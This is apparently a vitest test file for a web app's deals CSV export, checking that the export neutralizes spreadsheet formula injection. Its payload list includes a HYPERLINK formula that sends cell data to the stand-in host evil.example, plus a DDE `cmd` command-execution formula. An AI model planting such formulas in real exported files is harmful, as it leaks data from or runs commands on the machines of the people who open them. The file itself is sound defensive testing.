import { beforeAll, describe, expect, it } from 'vitest';
import request from 'supertest';
import type { Express } from 'express';
import { createApp } from '../server/app.js';
import { openDb } from '../server/db.js';
import type { AuthConfig } from '../server/auth.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

/**
 * As `expectDefused`, but for a payload that reached the file THROUGH the API:
 * text fields are trimmed on the way in, so the stored — and exported — value
 * is the trimmed one. The invariant that matters is unchanged.
 */
function expectDefusedInput(csv: string, payload: string, delimiter = ','): void {
  expectDefused(csv, payload.trim(), delimiter);
}

const auth: AuthConfig = {
  username: 'admin',
  password: 'test-password',
  secret: 'test-secret',
  ttlHours: 1,
  secureCookie: false,
};

async function signIn(app: Express): Promise<string> {
  const res = await request(app).post('/api/login').send({ username: 'admin', password: 'test-password' });
  expect(res.status).toBe(200);
  return res.headers['set-cookie']![0]!.split(';')[0]!;
}

let app: Express;
let cookie: string;

/** A deal titled `title` at a company named `company`. */
async function deal(title: string, company: string): Promise<void> {
  const created = await request(app).post('/api/companies').set('Cookie', cookie).send({ name: company });
  expect(created.status).toBe(201);
  const res = await request(app)
    .post('/api/deals')
    .set('Cookie', cookie)
    .send({ title, company_id: created.body.id, value_cents: 100_000 });
  expect(res.status).toBe(201);
}

async function exportCsv(): Promise<string> {
  const res = await request(app).get('/api/deals.csv').set('Cookie', cookie);
  expect(res.status).toBe(200);
  expect(res.headers['content-type']).toContain('text/csv');
  return res.text;
}

beforeAll(async () => {
  app = createApp({ db: openDb(':memory:'), auth });
  cookie = await signIn(app);
});

describe('deals CSV export neutralizes spreadsheet formulas', () => {
  it.each(PAYLOADS)('defuses %o in a deal title', async (payload) => {
    await deal(payload, 'Ordinary Co');
    expectDefusedInput(await exportCsv(), payload);
  });

  it('defuses a formula in a company name', async () => {
    await deal('Ordinary deal', "=cmd|'/c calc'!A1");
    expectDefusedInput(await exportCsv(), "=cmd|'/c calc'!A1");
  });

  it('leaves ordinary titles and decimal money alone', async () => {
    await deal('Relaunch, "phase 2"', 'Beispiel GmbH');
    const cells = cellsOf(await exportCsv());
    expect(cells).toContain('Relaunch, "phase 2"');
    expect(cells).toContain('1000.00');
    expect(cells.some((c) => c.startsWith("'1"))).toBe(false);
  });
});
